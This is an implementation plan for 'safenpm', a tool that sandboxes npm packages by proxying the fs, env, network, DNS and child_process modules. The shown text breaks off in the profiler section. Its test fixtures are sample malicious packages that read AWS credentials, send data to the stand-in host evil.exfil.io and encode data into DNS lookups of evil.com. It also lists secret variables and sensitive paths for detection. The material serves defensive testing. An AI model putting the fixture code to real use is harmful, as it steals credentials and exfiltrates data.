# safenpm — Implementation Plan

A behavioral sandbox for npm packages.
Every package runs with exactly the capabilities it needs. Nothing more.

---

## What This Builds

A CLI tool that wraps npm and enforces per-package runtime capability profiles.
When a package tries to read your AWS credentials, access unauthorized files,
make unexpected network calls, or spawn shell commands — it gets blocked before
the operation executes.

Two components:
- **Profiler** — determines what each package is allowed to do
- **Enforcer** — blocks anything outside that at runtime

---

## Project Structure

```
safenpm/
├── PLAN.md                          ← this file
├── package.json
├── tsconfig.json
├── .eslintrc.json
├── .gitignore
│
├── src/
│   ├── cli/
│   │   ├── index.ts                 ← entry point, parses argv
│   │   ├── install.ts               ← safenpm install command
│   │   ├── audit.ts                 ← safenpm audit command
│   │   └── run.ts                   ← safenpm run command
│   │
│   ├── profiler/
│   │   ├── index.ts                 ← orchestrates profiling for a package list
│   │   ├── resolver.ts              ← runs npm --package-lock-only, parses lock file
│   │   ├── registry-client.ts       ← fetches profiles from registry API
│   │   ├── local-profiler.ts        ← profiles packages locally when registry misses
│   │   ├── install-script-runner.ts ← runs postinstall scripts in instrumented env
│   │   ├── import-runner.ts         ← imports package and calls exports, observes behavior
│   │   └── native-detector.ts       ← scans for .node files
│   │
│   ├── enforcer/
│   │   ├── index.ts                 ← enforcer entry point, loaded via --require
│   │   ├── module-interceptor.ts    ← patches Module._load
│   │   ├── caller-resolver.ts       ← gets package name from call stack
│   │   ├── capabilities-loader.ts   ← reads package-capabilities.json
│   │   ├── shims/
│   │   │   ├── fs.shim.ts           ← proxies fs module
│   │   │   ├── net.shim.ts          ← proxies net module
│   │   │   ├── http.shim.ts         ← proxies http module
│   │   │   ├── https.shim.ts        ← proxies https module
│   │   │   ├── dns.shim.ts          ← proxies dns module
│   │   │   ├── child-process.shim.ts← proxies child_process module
│   │   │   └── env.proxy.ts         ← proxies process.env
│   │   └── violation-logger.ts      ← formats and outputs violation reports
│   │
│   ├── capabilities/
│   │   ├── schema.ts                ← TypeScript types for capability profiles
│   │   ├── writer.ts                ← writes package-capabilities.json
│   │   ├── reader.ts                ← reads and validates package-capabilities.json
│   │   ├── merger.ts                ← merges user approvals into profiles
│   │   └── path-matcher.ts          ← glob/pattern matching for allowed paths
│   │
│   ├── ui/
│   │   ├── approval-prompt.ts       ← terminal UI for reviewing + approving capabilities
│   │   ├── diff-display.ts          ← shows what changed between package versions
│   │   ├── violation-display.ts     ← pretty prints violations to terminal
│   │   └── spinner.ts               ← progress indicators
│   │
│   └── utils/
│       ├── path-resolver.ts         ← resolves ~, .., symlinks to absolute paths
│       ├── secret-detector.ts       ← identifies known secret env var patterns
│       ├── exfil-detector.ts        ← detects DNS exfiltration patterns
│       ├── stack-parser.ts          ← parses Error().stack into structured frames
│       └── logger.ts                ← structured logging to file + stdout
│
├── test/
│   ├── unit/
│   │   ├── caller-resolver.test.ts
│   │   ├── path-matcher.test.ts
│   │   ├── secret-detector.test.ts
│   │   ├── exfil-detector.test.ts
│   │   ├── fs-shim.test.ts
│   │   ├── net-shim.test.ts
│   │   ├── dns-shim.test.ts
│   │   ├── env-proxy.test.ts
│   │   └── child-process-shim.test.ts
│   │
│   ├── integration/
│   │   ├── enforcer-blocks-fs.test.ts
│   │   ├── enforcer-blocks-network.test.ts
│   │   ├── enforcer-blocks-env.test.ts
│   │   ├── enforcer-blocks-spawn.test.ts
│   │   └── enforcer-allows-declared.test.ts
│   │
│   └── fixtures/
│       ├── malicious-fs/            ← fake package that reads ~/.aws/credentials
│       ├── malicious-net/           ← fake package that phones home
│       ├── malicious-env/           ← fake package that reads secrets from env
│       ├── malicious-spawn/         ← fake package that runs shell commands
│       ├── malicious-dns/           ← fake package that does DNS exfiltration
│       └── legitimate-package/      ← well-behaved package for allow-path testing
│
└── docs/
    ├── architecture.md
    └── threat-model.md
```

---

## Phase 1 — Core Infrastructure
### Goal: the skeleton compiles, tests run, nothing works yet but the structure is solid

---

### Step 1.1 — Project Bootstrap

Initialize the project with TypeScript, testing, and linting.

**Actions:**
```bash
cd safenpm
npm init -y
npm install --save-dev typescript ts-node @types/node vitest eslint @typescript-eslint/parser
npx tsc --init
```

**tsconfig.json settings to set:**
```json
{
  "compilerOptions": {
    "target": "ES2020",
    "module": "CommonJS",
    "lib": ["ES2020"],
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "resolveJsonModule": true,
    "declaration": true,
    "sourceMap": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist", "test"]
}
```

**package.json bin entry:**
```json
{
  "bin": {
    "safenpm": "./dist/cli/index.js"
  },
  "scripts": {
    "build": "tsc",
    "test": "vitest",
    "dev": "ts-node src/cli/index.ts"
  }
}
```

**Deliverable:** `npx ts-node src/cli/index.ts install express` prints "install command received: express" and exits.

---

### Step 1.2 — Capability Schema

Define the TypeScript types that everything else is built on.
Get this right before writing a single shim.

**File: `src/capabilities/schema.ts`**

```typescript
export interface FsCapability {
  read: string[];    // allowed read paths, glob patterns supported
                     // e.g. ['./node_modules/bcrypt/**', '/tmp/**']
  write: string[];   // allowed write paths
}

export interface NetCapability {
  outbound: boolean;
  hosts: string[];   // ['*'] means any, ['*.github.com'] means github subdomains only
                     // empty array means outbound:true but hosts:[] = blocked in practice
}

export interface ChildProcessCapability {
  allowed: boolean;
  allowedCommands?: string[]; // optional: ['node', 'python'] — only specific executables
}

export interface PackageCapability {
  version: string;
  fs: FsCapability;
  net: NetCapability;
  env: string[];              // list of allowed env var names
  child_process: ChildProcessCapability;
  worker_threads: boolean;
  hasNativeModules: boolean;  // if true, JS enforcement is partial
  approvedBy: 'registry' | 'user' | 'auto';
  approvedAt: string;         // ISO 8601
  registryObservations?: number;
  userNote?: string;
}

export interface CapabilitiesFile {
  version: '1.0';
  generatedAt: string;
  projectRoot: string;
  packages: Record<string, PackageCapability>;
  // key is package name e.g. 'lodash', '@types/node'
}

// What a violation looks like when logged
export interface Violation {
  timestamp: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  package: string;
  packageVersion: string;
  attempted: string;      // human readable: "fs.readFileSync('/home/user/.aws/credentials')"
  reason: string;         // CREDENTIAL_THEFT | UNAUTHORIZED_FS_READ | UNAUTHORIZED_NET | etc.
  blocked: boolean;
  stackTrace: string[];
}
```

**Deliverable:** Schema compiles. No logic yet, just types.

---

### Step 1.3 — Path Utilities

These utilities are used everywhere. Build and test them first.

**File: `src/utils/path-resolver.ts`**

Resolves any path input (relative, `~`, `../../../etc`) to an absolute canonical path.

```typescript
import path from 'path';
import os from 'os';

export function resolvePath(inputPath: string): string {
  // handle ~ expansion
  if (inputPath.startsWith('~')) {
    return path.resolve(os.homedir(), inputPath.slice(2));
  }
  return path.resolve(inputPath);
}

export function normalizeForComparison(p: string): string {
  return resolvePath(p).toLowerCase(); // case-insensitive on Windows
}
```

**File: `src/capabilities/path-matcher.ts`**

Checks if a resolved path is within any of the allowed patterns.

```typescript
import { resolvePath } from '../utils/path-resolver';
import path from 'path';

export function isPathAllowed(
  requestedPath: string,
  allowedPatterns: string[]
): boolean {
  const resolved = resolvePath(requestedPath);

  return allowedPatterns.some(pattern => {
    const resolvedPattern = resolvePath(pattern);

    // exact match
    if (resolved === resolvedPattern) return true;

    // directory prefix match: allowed=/tmp means /tmp/anything is ok
    if (resolved.startsWith(resolvedPattern + path.sep)) return true;

    // glob: allowed=./node_modules/bcrypt/**
    if (pattern.endsWith('/**')) {
      const base = resolvePath(pattern.slice(0, -3));
      return resolved.startsWith(base);
    }

    return false;
  });
}

// Paths that are always sensitive regardless of profile
const ALWAYS_SENSITIVE = [
  os.homedir(),           // entire home directory
  '/etc/passwd',
  '/etc/shadow',
  '/etc/sudoers',
  '/proc',
  '/sys',
];

export function isSensitivePath(resolvedPath: string): boolean {
  return ALWAYS_SENSITIVE.some(s =>
    resolvedPath === s || resolvedPath.startsWith(s + path.sep)
  );
}
```

**File: `src/utils/secret-detector.ts`**

```typescript
// Known high-value environment variable names
const KNOWN_SECRET_VARS = new Set([
  'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
  'AWS_DEFAULT_REGION',  // lower value but still sensitive
  'DATABASE_URL', 'DB_PASSWORD', 'DB_HOST', 'POSTGRES_PASSWORD',
  'MYSQL_ROOT_PASSWORD', 'MONGO_URI', 'REDIS_URL',
  'STRIPE_SECRET_KEY', 'STRIPE_PUBLISHABLE_KEY',
  'GITHUB_TOKEN', 'GH_TOKEN', 'NPM_TOKEN',
  'HEROKU_API_KEY', 'VERCEL_TOKEN', 'NETLIFY_AUTH_TOKEN',
  'OPENAI_API_KEY', 'ANTHROPIC_API_KEY',
  'PRIVATE_KEY', 'SECRET_KEY', 'JWT_SECRET', 'SESSION_SECRET',
  'ENCRYPTION_KEY', 'SIGNING_KEY',
]);

const SECRET_PATTERNS = [
  /SECRET/i,
  /PASSWORD/i,
  /PRIVATE_KEY/i,
  /API_KEY/i,
  /ACCESS_TOKEN/i,
  /AUTH_TOKEN/i,
  /CREDENTIALS/i,
];

export function isSecretEnvVar(varName: string): boolean {
  if (KNOWN_SECRET_VARS.has(varName)) return true;
  return SECRET_PATTERNS.some(p => p.test(varName));
}

export function getSecretSeverity(varName: string): 'HIGH' | 'CRITICAL' {
  if (KNOWN_SECRET_VARS.has(varName)) return 'CRITICAL';
  return 'HIGH';
}
```

**File: `src/utils/exfil-detector.ts`**

```typescript
// Detects DNS exfiltration — data encoded in subdomain labels

export function looksLikeExfiltration(hostname: string): boolean {
  const labels = hostname.split('.');

  // ignore TLD and second-level domain (last 2 parts)
  const subdomains = labels.slice(0, -2);

  return subdomains.some(label => {
    if (label.length > 32) return true;                    // too long to be a real subdomain
    if (/^[0-9a-f]{16,}$/i.test(label)) return true;     // looks like hex-encoded data
    if (isBase64Like(label) && label.length > 20) return true;
    return false;
  });
}

function isBase64Like(s: string): boolean {
  return /^[A-Za-z0-9+/=_-]{20,}$/.test(s) && s.length % 4 === 0;
}
```

**Tests to write for this step (`test/unit/path-matcher.test.ts`):**
```
resolvePath('~/.aws/credentials')  → '/home/username/.aws/credentials'
resolvePath('../../../etc/passwd') → '/etc/passwd'
isPathAllowed('/tmp/build/out.js', ['/tmp/**']) → true
isPathAllowed('/home/user/.ssh',   ['/tmp/**']) → false
isSensitivePath('/home/user/.aws/credentials') → true
isSensitivePath('/tmp/safe-file')              → false
isSecretEnvVar('AWS_SECRET_ACCESS_KEY')        → true
isSecretEnvVar('NODE_ENV')                     → false
looksLikeExfiltration('dGhpcyBpcw.evil.com')  → true
looksLikeExfiltration('api.github.com')        → false
```

**Deliverable:** All utility functions pass tests. These are the foundation — if they're wrong, the enforcer has holes.

---

### Step 1.4 — Stack Parser and Caller Resolver

The most critical utility. Gets the package name from whichever stack frame is calling a shimmed module.

**File: `src/utils/stack-parser.ts`**

```typescript
export interface StackFrame {
  file: string | null;
  line: number | null;
  column: number | null;
  raw: string;
}

export function parseStack(errorStack: string): StackFrame[] {
  return errorStack
    .split('\n')
    .slice(1) // skip "Error" header line
    .map(line => {
      const match = line.match(/at .+ \((.+):(\d+):(\d+)\)/) ||
                    line.match(/at (.+):(\d+):(\d+)/);
      if (!match) return { file: null, line: null, column: null, raw: line };
      return {
        file: match[1],
        line: parseInt(match[2]),
        column: parseInt(match[3]),
        raw: line
      };
    })
    .filter(f => f.file !== null);
}
```

**File: `src/enforcer/caller-resolver.ts`**

```typescript
import path from 'path';
import { parseStack } from '../utils/stack-parser';

// Cache: filename → package name
// avoids calling new Error().stack repeatedly for the same file
const cache = new Map<string, string | null>();

export function getCallerPackage(parentFilename: string | undefined): string | null {
  if (!parentFilename) return null;

  if (cache.has(parentFilename)) return cache.get(parentFilename)!;

  const result = extractPackageName(parentFilename);
  cache.set(parentFilename, result);
  return result;
}

export function getCallerPackageFromStack(): string | null {
  const stack = new Error().stack ?? '';
  const frames = parseStack(stack);

  for (const frame of frames) {
    if (!frame.file) continue;

    // skip internal node files and the enforcer itself
    if (frame.file.startsWith('node:')) continue;
    if (frame.file.includes('safenpm/dist')) continue;
    if (frame.file.includes('safenpm/src')) continue;

    const pkg = extractPackageName(frame.file);
    if (pkg) return pkg;
  }

  return null; // caller is user's application code
}

function extractPackageName(filePath: string): string | null {
  // handles: /project/node_modules/lodash/lodash.js → 'lodash'
  // handles: /project/node_modules/@types/node/index.js → '@types/node'
  // handles: C:\project\node_modules\express\index.js (Windows)

  const normalized = filePath.replace(/\\/g, '/');

  const scopedMatch = normalized.match(/node_modules\/((@[^/]+)\/([^/]+))\//);
  if (scopedMatch) return scopedMatch[1];

  const regularMatch = normalized.match(/node_modules\/([^/]+)\//);
  if (regularMatch) return regularMatch[1];

  return null;
}
```

**Tests for this step:**
```
extractPackageName('/project/node_modules/lodash/lodash.js')     → 'lodash'
extractPackageName('/project/node_modules/@types/node/index.js') → '@types/node'
extractPackageName('/project/src/app.ts')                        → null
extractPackageName('node:fs')                                     → null
```

**Deliverable:** Caller identification works reliably for regular and scoped packages.

---

### Step 1.5 — Violation Logger

Every blocked action gets logged. Build the logger before the shims so the shims have somewhere to report to.

**File: `src/enforcer/violation-logger.ts`**

```typescript
import fs from 'fs';
import path from 'path';
import type { Violation } from '../capabilities/schema';

const LOG_FILE = path.join(process.cwd(), '.safenpm-violations.log');

export function logViolation(v: Violation): void {
  const line = JSON.stringify({ ...v, timestamp: new Date().toISOString() });

  // append to log file (non-blocking)
  fs.appendFile(LOG_FILE, line + '\n', () => {});

  // print to stderr (always visible, doesn't mix with app stdout)
  printViolationToConsole(v);
}

function printViolationToConsole(v: Violation): void {
  const colors = {
    CRITICAL: '\x1b[41m\x1b[37m', // white on red background
    HIGH:     '\x1b[31m',          // red
    MEDIUM:   '\x1b[33m',          // yellow
    LOW:      '\x1b[36m',          // cyan
    reset:    '\x1b[0m'
  };

  const c = colors[v.severity];
  const r = colors.reset;

  process.stderr.write(`
${c}[SAFENPM ${v.severity}]${r} ${v.blocked ? 'BLOCKED' : 'ALLOWED (logged)'}
  Package  : ${v.package}
  Attempted: ${v.attempted}
  Reason   : ${v.reason}
  Stack    : ${v.stackTrace[0] ?? 'unknown'}
`);
}
```

**Deliverable:** `logViolation()` prints colored output and writes to log file.

---

## Phase 2 — The Enforcer Shims
### Goal: a running Node app cannot exceed declared capabilities

---

### Step 2.1 — Module Interceptor

The entry point of the enforcer. Patches `Module._load` before any user code runs.

**File: `src/enforcer/module-interceptor.ts`**

```typescript
import Module from 'module';
import { getCallerPackage } from './caller-resolver';
import { loadCapabilities } from '../capabilities/reader';
import { createFsShim } from './shims/fs.shim';
import { createNetShim } from './shims/net.shim';
import { createHttpShim } from './shims/http.shim';
import { createHttpsShim } from './shims/https.shim';
import { createDnsShim } from './shims/dns.shim';
import { createChildProcessShim } from './shims/child-process.shim';
import { installEnvProxy } from './shims/env.proxy';

const SHIMMED_MODULES = new Set(['fs', 'net', 'http', 'https', 'dns', 'child_process']);

// cache: "packageName:moduleName" → shim
const shimCache = new Map<string, unknown>();

export function installInterceptor(): void {
  const capabilities = loadCapabilities();
  if (!capabilities) {
    process.stderr.write('[safenpm] No package-capabilities.json found. Enforcer inactive.\n');
    return;
  }

  // install env proxy first — before any module loading
  installEnvProxy(capabilities);

  const originalLoad = (Module as any)._load.bind(Module);

  (Module as any)._load = function(
    request: string,
    parent: NodeModule | null,
    isMain: boolean
  ): unknown {
    const realModule = originalLoad(request, parent, isMain);

    if (!SHIMMED_MODULES.has(request)) return realModule;

    const callerPackage = getCallerPackage(parent?.filename);
    if (!callerPackage) return realModule; // user's own code — no restriction

    const cacheKey = `${callerPackage}:${request}`;
    if (shimCache.has(cacheKey)) return shimCache.get(cacheKey);

    const profile = capabilities.packages[callerPackage];
    const shim = createShim(request, realModule, profile ?? null, callerPackage);

    shimCache.set(cacheKey, shim);
    return shim;
  };
}

function createShim(
  moduleName: string,
  realModule: unknown,
  profile: PackageCapability | null,
  packageName: string
): unknown {
  switch (moduleName) {
    case 'fs':            return createFsShim(realModule, profile, packageName);
    case 'net':           return createNetShim(realModule, profile, packageName);
    case 'http':          return createHttpShim(realModule, profile, packageName);
    case 'https':         return createHttpsShim(realModule, profile, packageName);
    case 'dns':           return createDnsShim(realModule, profile, packageName);
    case 'child_process': return createChildProcessShim(realModule, profile, packageName);
    default:              return realModule;
  }
}
```

---

### Step 2.2 — fs Shim

**File: `src/enforcer/shims/fs.shim.ts`**

Cover every fs method that touches the filesystem.

```typescript
import type { PackageCapability, Violation } from '../../capabilities/schema';
import { isPathAllowed, isSensitivePath } from '../../capabilities/path-matcher';
import { resolvePath } from '../../utils/path-resolver';
import { logViolation } from '../violation-logger';
import { getCallerPackageFromStack } from '../caller-resolver';

// every method that reads
const READ_OPS = [
  'readFile', 'readFileSync',
  'createReadStream',
  'open', 'openSync',
  'read', 'readSync',
  'readdir', 'readdirSync',
  'readlink', 'readlinkSync',
  'stat', 'statSync',
  'lstat', 'lstatSync',
  'access', 'accessSync',
  'watch', 'watchFile',
  'existsSync',
];

// every method that writes
const WRITE_OPS = [
  'writeFile', 'writeFileSync',
  'createWriteStream',
  'appendFile', 'appendFileSync',
  'unlink', 'unlinkSync',
  'mkdir', 'mkdirSync',
  'rmdir', 'rmdirSync',
  'rm', 'rmSync',
  'rename', 'renameSync',
  'copyFile', 'copyFileSync',
  'chmod', 'chmodSync',
  'chown', 'chownSync',
  'truncate', 'truncateSync',
  'symlink', 'symlinkSync',
];

export function createFsShim(
  realFs: any,
  profile: PackageCapability | null,
  packageName: string
): any {
  const allowedReads  = profile?.fs?.read  ?? [];
  const allowedWrites = profile?.fs?.write ?? [];

  return new Proxy(realFs, {
    get(target, prop: string) {
      if (READ_OPS.includes(prop)) {
        return function(filePath: string, ...args: any[]) {
          const resolved = resolvePath(filePath);

          if (!isPathAllowed(resolved, allowedReads)) {
            const violation: Violation = {
              timestamp: new Date().toISOString(),
              severity: isSensitivePath(resolved) ? 'CRITICAL' : 'HIGH',
              package: packageName,
              packageVersion: profile?.version ?? 'unknown',
              attempted: `fs.${prop}('${resolved}')`,
              reason: isSensitivePath(resolved)
                ? 'CREDENTIAL_THEFT_ATTEMPT'
                : 'UNAUTHORIZED_FS_READ',
              blocked: true,
              stackTrace: new Error().stack?.split('\n').slice(1) ?? [],
            };

            logViolation(violation);
            throw new Error(`[safenpm] BLOCKED: ${packageName} cannot read ${resolved}`);
          }

          return target[prop](filePath, ...args);
        };
      }

      if (WRITE_OPS.includes(prop)) {
        return function(filePath: string, ...args: any[]) {
          const resolved = resolvePath(filePath);

          if (!isPathAllowed(resolved, allowedWrites)) {
            const violation: Violation = {
              timestamp: new Date().toISOString(),
              severity: 'HIGH',
              package: packageName,
              packageVersion: profile?.version ?? 'unknown',
              attempted: `fs.${prop}('${resolved}')`,
              reason: 'UNAUTHORIZED_FS_WRITE',
              blocked: true,
              stackTrace: new Error().stack?.split('\n').slice(1) ?? [],
            };

            logViolation(violation);
            throw new Error(`[safenpm] BLOCKED: ${packageName} cannot write ${resolved}`);
          }

          return target[prop](filePath, ...args);
        };
      }

      return target[prop];
    }
  });
}
```

---

### Step 2.3 — env Proxy

Install this before any module loads. Covers `process.env.ANY_SECRET`.

**File: `src/enforcer/shims/env.proxy.ts`**

```typescript
import type { CapabilitiesFile } from '../../capabilities/schema';
import { isSecretEnvVar, getSecretSeverity } from '../../utils/secret-detector';
import { getCallerPackageFromStack } from '../caller-resolver';
import { logViolation } from '../violation-logger';

export function installEnvProxy(capabilities: CapabilitiesFile): void {
  const realEnv = { ...process.env }; // snapshot of real env

  const proxy = new Proxy(realEnv, {
    get(target, prop: string) {
      const callerPackage = getCallerPackageFromStack();

      // user's own code — unrestricted
      if (!callerPackage) return target[prop];

      const profile = capabilities.packages[callerPackage];
      const allowedVars = profile?.env ?? [];

      if (!allowedVars.includes(prop)) {
        // if it's a known secret — treat as attack, return nothing
        if (isSecretEnvVar(prop)) {
          logViolation({
            timestamp: new Date().toISOString(),
            severity: getSecretSeverity(prop),
            package: callerPackage,
            packageVersion: profile?.version ?? 'unknown',
            attempted: `process.env.${prop}`,
            reason: 'CREDENTIAL_THEFT_ATTEMPT',
            blocked: true,
            stackTrace: new Error().stack?.split('\n').slice(1) ?? [],
          });
          return undefined; // package gets nothing, doesn't know the var exists
        }

        // non-secret var accessed without declaration — warn but allow
        logViolation({
          timestamp: new Date().toISOString(),
          severity: 'LOW',
          package: callerPackage,
          packageVersion: profile?.version ?? 'unknown',
          attempted: `process.env.${prop}`,
          reason: 'UNDECLARED_ENV_ACCESS',
          blocked: false,
          stackTrace: [],
        });
      }

      return target[prop];
    },

    set(target, prop: string, value: any) {
      // packages writing to process.env is suspicious but allowed
      // log it for audit purposes
      const callerPackage = getCallerPackageFromStack();
      if (callerPackage) {
        logViolation({
          timestamp: new Date().toISOString(),
          severity: 'MEDIUM',
          package: callerPackage,
          packageVersion: capabilities.packages[callerPackage]?.version ?? 'unknown',
          attempted: `process.env.${prop} = '${String(value).slice(0, 20)}...'`,
          reason: 'ENV_MUTATION',
          blocked: false,
          stackTrace: [],
        });
      }
      target[prop] = value;
      return true;
    }
  });

  Object.defineProperty(process, 'env', {
    value: proxy,
    writable: false,
    configurable: false,
  });
}
```

---

### Step 2.4 — net, http, https Shims

**File: `src/enforcer/shims/net.shim.ts`**

```typescript
import type { PackageCapability } from '../../capabilities/schema';
import { logViolation } from '../violation-logger';

export function createNetShim(realNet: any, profile: PackageCapability | null, packageName: string): any {
  const netProfile = profile?.net ?? { outbound: false, hosts: [] };

  function checkHost(host: string, method: string): void {
    if (!netProfile.outbound) {
      logAndThrow(packageName, profile, `net.${method} → ${host}`, 'UNAUTHORIZED_OUTBOUND_CONNECTION', 'HIGH');
    }
    if (!isHostAllowed(host, netProfile.hosts)) {
      logAndThrow(packageName, profile, `net.${method} → ${host}`, 'CONNECTION_TO_UNAUTHORIZED_HOST', 'CRITICAL');
    }
  }

  return new Proxy(realNet, {
    get(target, prop: string) {
      if (prop === 'connect' || prop === 'createConnection') {
        return function(options: any, ...args: any[]) {
          const host = resolveHost(options);
          checkHost(host, prop);
          return target[prop](options, ...args);
        };
      }
      return target[prop];
    }
  });
}

function resolveHost(options: any): string {
  if (typeof options === 'string') return options;
  return options?.host ?? options?.hostname ?? 'unknown';
}

export function isHostAllowed(host: string, allowedHosts: string[]): boolean {
  return allowedHosts.some(pattern => {
    if (pattern === '*') return true;
    if (pattern.startsWith('*.')) return host.endsWith(pattern.slice(1));
    return host === pattern;
  });
}
```

Apply the same pattern for `http.shim.ts` (intercept `http.request`, `http.get`) and `https.shim.ts`.

---

### Step 2.5 — DNS Shim

**File: `src/enforcer/shims/dns.shim.ts`**

```typescript
import { looksLikeExfiltration } from '../../utils/exfil-detector';

const DNS_METHODS = [
  'lookup', 'resolve', 'resolve4', 'resolve6',
  'resolveMx', 'resolveTxt', 'resolveSrv', 'resolveNs', 'resolveCname'
];

export function createDnsShim(realDns: any, profile: PackageCapability | null, packageName: string): any {
  const netProfile = profile?.net ?? { outbound: false, hosts: [] };

  return new Proxy(realDns, {
    get(target, prop: string) {
      if (DNS_METHODS.includes(prop)) {
        return function(hostname: string, ...args: any[]) {

          if (!netProfile.outbound) {
            logAndThrow(packageName, profile, `dns.${prop}('${hostname}')`, 'DNS_BLOCKED_NO_NET_PERMISSION', 'HIGH');
          }

          if (looksLikeExfiltration(hostname)) {
            logAndThrow(packageName, profile, `dns.${prop}('${hostname}')`, 'DNS_EXFILTRATION_ATTEMPT', 'CRITICAL');
          }

          return target[prop](hostname, ...args);
        };
      }
      return target[prop];
    }
  });
}
```

---

### Step 2.6 — child_process Shim

**File: `src/enforcer/shims/child-process.shim.ts`**

```typescript
const SPAWN_METHODS = ['exec', 'execSync', 'spawn', 'spawnSync', 'execFile', 'execFileSync', 'fork'];

export function createChildProcessShim(realCp: any, profile: PackageCapability | null, packageName: string): any {
  const cpProfile = profile?.child_process ?? { allowed: false };

  return new Proxy(realCp, {
    get(target, prop: string) {
      if (SPAWN_METHODS.includes(prop)) {
        return function(command: string, ...args: any[]) {

          if (!cpProfile.allowed) {
            logAndThrow(packageName, profile, `child_process.${prop}('${command}')`, 'UNAUTHORIZED_PROCESS_SPAWN', 'HIGH');
          }

          // even if allowed — log the command for audit
          logViolation({
            severity: 'LOW',
            package: packageName,
            attempted: `child_process.${prop}('${command}')`,
            reason: 'PROCESS_SPAWN_AUDIT',
            blocked: false,
            // ...rest of fields
          });

          return target[prop](command, ...args);
        };
      }
      return target[prop];
    }
  });
}
```

---

### Step 2.7 — Enforcer Entry Point

**File: `src/enforcer/index.ts`**

This is the file loaded via `--require`. Twelve lines.

```typescript
import { installInterceptor } from './module-interceptor';

// this runs immediately when the file is required
// before any of the app's own code executes
installInterceptor();
```

**Usage:**
```bash
node --require safenpm/dist/enforcer/index.js src/app.js
```

---

### Step 2.8 — Write Test Fixtures and Integration Tests

This is where you prove the enforcer actually works.

**`test/fixtures/malicious-fs/index.js`**
```javascript
const fs = require('fs');
// tries to read AWS credentials
module.exports = function steal() {
  return fs.readFileSync('/home/' + process.env.USER + '/.aws/credentials', 'utf8');
};
```

**`test/fixtures/malicious-env/index.js`**
```javascript
module.exports = function steal() {
  return process.env.AWS_SECRET_ACCESS_KEY;
};
```

**`test/fixtures/malicious-net/index.js`**
```javascript
const https = require('https');
module.exports = function exfil(data) {
  return new Promise(resolve => {
    https.request({ host: 'evil.exfil.io', path: '/?d=' + data }, resolve).end();
  });
};
```

**`test/fixtures/malicious-dns/index.js`**
```javascript
const dns = require('dns');
module.exports = function exfil(data) {
  const encoded = Buffer.from(data).toString('base64').replace(/=/g, '');
  dns.lookup(encoded + '.evil.com', () => {});
};
```

**`test/integration/enforcer-blocks-fs.test.ts`**
```typescript
import { describe, it, expect, beforeAll } from 'vitest';
import { installInterceptor } from '../../src/enforcer/module-interceptor';

beforeAll(() => {
  // set up a capabilities file where malicious-fs has no fs permissions
  process.chdir('./test/fixtures');
  // write a package-capabilities.json that gives malicious-fs no access
  installInterceptor();
});

describe('fs enforcement', () => {
  it('blocks read of ~/.aws/credentials', () => {
    const malicious = require('../fixtures/malicious-fs');
    expect(() => malicious.steal()).toThrow('[safenpm] BLOCKED');
  });

  it('allows read within declared paths', () => {
    // package with fs.read: ['/tmp/**'] should succeed when reading /tmp/test.txt
    // ...
  });
});
```

Write equivalent tests for each attack vector.

**Deliverable at end of Phase 2:**
```bash
node --require safenpm/dist/enforcer/index.js test/fixtures/malicious-fs/index.js
# → [SAFENPM CRITICAL] BLOCKED
# →   Package  : malicious-fs
# →   Attempted: fs.readFileSync('/home/user/.aws/credentials')
# →   Reason   : CREDENTIAL_THEFT_ATTEMPT
```

---

## Phase 3 — The Profiler
### Goal: automatically determine what each package needs

---

### Step 3.1 — Dependency Resolver

Before profiling, get the full list of what npm will install.

**File: `src/profiler/resolver.ts`**

```typescript
import { execSync } from 'child_process';
import fs from 'fs';

export interface ResolvedPackage {
  name: string;
  version: string;
  resolved: string; // tarball URL
  integrity: string;
}

export function resolvePackageTree(packages: string[]): ResolvedPackage[] {
  // run npm install with --dry-run to get the full resolved tree
  // without downloading or executing anything
  execSync(`npm install ${packages.join(' ')} --package-lock-only --ignore-scripts`, {
    stdio: ['ignore', 'ignore', 'ignore']
  });

  const lockFile = JSON.parse(fs.readFileSync('package-lock.json', 'utf8'));

  return Object.entries(lockFile.packages as Record<string, any>)
    .filter(([key]) => key.startsWith('node_modules/'))
    .map(([key, value]) => ({
      name: key.replace('node_modules/', ''),
      version: value.version,
      resolved: value.resolved,
      integrity: value.integrity,
    }));
}
```

---

### Step 3.2 — Registry Client

Check if a package already has a profile in the registry before profiling locally.

**File: `src/profiler/registry-client.ts`**

```typescript
import https from 'https';
import type { PackageCapability } from '../capabilities/schema';

const REGISTRY_BASE = 'https://registry.safenpm.dev'; // your registry

export async function fetchProfile(
  packageName: string,
  version: string
): Promise<PackageCapability | null> {
  return new Promise((resolve) => {
    const encodedName = encodeURIComponent(packageName);
    const url = `${REGISTRY_BASE}/profile/${encodedName}/${version}`;

    https.get(url, (res) => {
      if (res.statusCode === 404) {
        resolve(null); // not in registry yet
        return;
      }

      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data) as PackageCapability);
        } catch {
          resolve(null);
        }
      });
    }).on('error', () => resolve(null)); // network error → fall back to local profiling
  });
}
```

---

### Step 3.3 — Native Module Detector

Run this before any other profiling. Packages with native modules get flagged immediately.

**File: `src/profiler/native-detector.ts`**

```typescript
import { globSync } from 'glob';
import path from 'path';

export interface NativeModuleReport {
  hasNative: boolean;
  files: string[];
  risk: string;
}

export function detectNativeModules(packageDir: string): NativeModuleReport {
  const nativeFiles = globSync('**/*.node', {
    cwd: packageDir,
    absolute: true
  });

  const buildScripts = globSync('**/binding.gyp', { cwd: packageDir });

  if (nativeFiles.length === 0 && buildScripts.length === 0) {
    return { hasNative: false, files: [], risk: '' };
  }

  return {
    hasNative: true,
    files: [...nativeFiles, ...buildScripts],
    risk: 'Contains native C/C++ code. JS-level enforcement does not apply to native code paths. Full enforcement requires OS-level sandboxing.',
  };
}
```

---

### Step 3.4 — Local Profiler (Install Script Runner)

For packages not in the registry, profile their install-time scripts.
This is the highest-risk window — postinstall scripts run arbitrary code.

**File: `src/profiler/install-script-runner.ts`**

```typescript
import { execSync } from 'child_process';
import path from 'path';
import os from 'os';
import fs from 'fs';

export interface ObservedBehavior {
  filesRead: string[];
  filesWritten: string[];
  networkHosts: string[];
  envVarsRead: string[];
  processesSpawned: string[];
}

export function profileInstallScript(
  packageDir: string,
  packageJson: any
): ObservedBehavior {
  const hasInstallScript = packageJson.scripts?.postinstall ||
